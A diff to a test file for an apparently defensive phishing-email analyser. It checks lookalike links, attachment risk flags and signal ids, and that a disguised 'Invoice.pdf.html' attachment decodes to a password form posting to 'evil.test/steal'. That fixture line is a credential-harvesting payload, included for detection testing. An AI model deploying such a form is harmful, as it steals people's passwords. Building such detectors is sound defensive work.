@@ -71,7 +71,9 @@ describe('the source of an email', () => {
       ['https://www.paypal.com/help', null],
       ['https://secure-paypa1.test/verify?id=7&amp;x=1', null],
     ]);
-    expect(m.attachments).toEqual([{ name: 'Invoice.pdf.html', type: 'text/html', risk: 'web_page' }]);
+    expect(m.attachments.map(({ data: _, ...a }) => a)).toEqual([{ name: 'Invoice.pdf.html', type: 'text/html', risk: 'web_page' }]);
+    // its content is decoded and kept in the page, to be hashed here or opened in the sandbox when the person asks
+    expect(new TextDecoder().decode(m.attachments[0]!.data!)).toBe('<form action="https://evil.test/steal"><input type=password></form>');
     expect(ids(PHISH)).toEqual(['auth_failed', 'reply_elsewhere', 'name_shows_other_address', 'attachment_web_page', 'link_text_elsewhere']);
     // the attachment is listed, never read for links: a form inside it is not a link to check
     expect(m.links.some((l) => l.host === 'evil.test')).toBe(false);
